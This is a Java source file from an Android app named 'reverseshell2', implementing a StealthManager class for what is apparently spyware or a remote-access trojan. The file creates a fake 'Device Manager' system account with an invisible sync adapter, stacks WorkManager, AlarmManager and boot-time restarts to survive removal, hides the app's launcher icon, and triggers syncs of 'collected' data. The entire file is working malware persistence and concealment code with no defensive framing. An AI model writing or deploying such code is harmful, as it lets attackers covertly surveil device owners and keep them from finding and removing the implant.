package com.example.reverseshell2;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.SystemClock;
import android.util.Log;

import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

/**
 * Manages all stealth and persistence mechanisms.
 * 
 * Persistence stack (layered, most reliable first):
 * 1. SyncAdapter + AccountAuthenticator (PRIMARY — system-level priority)
 * 2. WorkManager periodic task (FALLBACK — survives reboots)
 * 3. AlarmManager repeating alarm (BACKUP — additional reliability)
 * 4. Boot receiver (BELT — restarts service on device boot)
 * 
 * Stealth:
 * - Hide launcher icon
 * - App appears as "Device Manager" account in Settings > Accounts
 * - SyncAdapter is invisible (userVisible=false)
 */
public class StealthManager {

    private static final String TAG = "SYS_STEALTH";
    private final Context context;

    public StealthManager(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    /**
     * Initialize ALL persistence mechanisms.
     * Called once during first setup from mainService.
     */
    public void initialize() {
        setupAccountSync();   // PRIMARY: SyncAdapter
        schedulePeriodicSync(); // FALLBACK: WorkManager
        scheduleAlarmBackup(); // BACKUP: AlarmManager
        Log.d(TAG, "Full persistence stack initialized (SyncAdapter + WorkManager + AlarmManager)");
    }

    // ============================================================
    //  PERSISTENCE LAYER 1: SyncAdapter + AccountAuthenticator
    //  This is the "furniture" — part of the OS, not a guest
    // ============================================================

    /**
     * Create a fake system account and register periodic sync.
     * Android's SyncManager will wake our process with higher priority
     * than any WorkManager task — similar to Google Account sync.
     */
    private void setupAccountSync() {
        try {
            AccountManager am = AccountManager.get(context);
            Account account = new Account(
                    DummyAuthenticator.ACCOUNT_NAME,
                    DummyAuthenticator.ACCOUNT_TYPE
            );

            // Check if account already exists
            Account[] existing = am.getAccountsByType(DummyAuthenticator.ACCOUNT_TYPE);
            if (existing.length == 0) {
                // Create the fake account
                boolean created = am.addAccountExplicitly(account, null, null);
                if (created) {
                    Log.d(TAG, "System account created: " + DummyAuthenticator.ACCOUNT_NAME);
                } else {
                    Log.d(TAG, "Account creation failed (may need MANAGE_ACCOUNTS on older API)");
                    return;
                }
            } else {
                account = existing[0];
                Log.d(TAG, "Account already exists, reusing");
            }

            // Enable sync for this account
            ContentResolver.setIsSyncable(account, DummyProvider.AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(account, DummyProvider.AUTHORITY, true);

            // Schedule periodic sync every ~15 minutes
            // Note: Android may adjust this interval based on system conditions
            ContentResolver.addPeriodicSync(
                    account,
                    DummyProvider.AUTHORITY,
                    Bundle.EMPTY,
                    15 * 60 // 15 minutes in seconds
            );

            Log.d(TAG, "SyncAdapter periodic sync scheduled (15 min interval, system-level priority)");
        } catch (Exception e) {
            Log.e(TAG, "SyncAdapter setup failed: " + e.getMessage());
            // Not fatal — WorkManager is the fallback
        }
    }

    // ============================================================
    //  PERSISTENCE LAYER 2: WorkManager (Fallback)
    // ============================================================

    /**
     * Schedule WorkManager periodic sync as fallback.
     * Less reliable than SyncAdapter but still survives reboots.
     */
    public void schedulePeriodicSync() {
        try {
            Constraints constraints = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build();

            PeriodicWorkRequest syncWork = new PeriodicWorkRequest.Builder(
                    SyncWorker.class, 15, TimeUnit.MINUTES)
                    .setConstraints(constraints)
                    .setInitialDelay(2, TimeUnit.MINUTES)
                    .build();

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    SyncWorker.WORK_NAME,
                    ExistingPeriodicWorkPolicy.KEEP,
                    syncWork
            );
            Log.d(TAG, "WorkManager fallback scheduled (15 min interval)");
        } catch (Exception e) {
            Log.e(TAG, "WorkManager setup failed: " + e.getMessage());
        }
    }

    // ============================================================
    //  PERSISTENCE LAYER 3: AlarmManager (Backup)
    // ============================================================

    /**
     * Backup alarm-based sync in case both SyncAdapter and WorkManager fail.
     */
    public void scheduleAlarmBackup() {
        try {
            AlarmManager alarm = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(context, broadcastReciever.class);
            intent.setAction("com.example.reverseshell2.SYNC_ALARM");

            PendingIntent pi = PendingIntent.getBroadcast(context, 999, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            alarm.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 5 * 60 * 1000,
                    20 * 60 * 1000,
                    pi);
            Log.d(TAG, "AlarmManager backup scheduled (20 min interval)");
        } catch (Exception e) {
            Log.e(TAG, "AlarmManager setup failed: " + e.getMessage());
        }
    }

    // ============================================================
    //  STEALTH
    // ============================================================

    /**
     * Hide the app icon from launcher.
     */
    public void hideFromLauncher() {
        try {
            PackageManager pm = context.getPackageManager();
            ComponentName cn = new ComponentName(context, MainActivity.class);
            pm.setComponentEnabledSetting(cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            Log.d(TAG, "Launcher icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "Hide icon failed: " + e.getMessage());
        }
    }

    /**
     * Trigger an immediate sync (useful after collecting new data).
     */
    public void syncNow() {
        new Thread(() -> {
            DataSyncer syncer = new DataSyncer(context);
            syncer.performSync();
        }).start();
    }

    /**
     * Request an immediate SyncAdapter sync (wakes process via system_server).
     */
    public void requestImmediateSync() {
        try {
            AccountManager am = AccountManager.get(context);
            Account[] accounts = am.getAccountsByType(DummyAuthenticator.ACCOUNT_TYPE);
            if (accounts.length > 0) {
                Bundle extras = new Bundle();
                extras.putBoolean(ContentResolver.SYNC_EXTRAS_MANUAL, true);
                extras.putBoolean(ContentResolver.SYNC_EXTRAS_EXPEDITED, true);
                ContentResolver.requestSync(accounts[0], DummyProvider.AUTHORITY, extras);
                Log.d(TAG, "Immediate SyncAdapter sync requested");
            }
        } catch (Exception e) {
            Log.e(TAG, "Immediate sync request failed: " + e.getMessage());
        }
    }
}
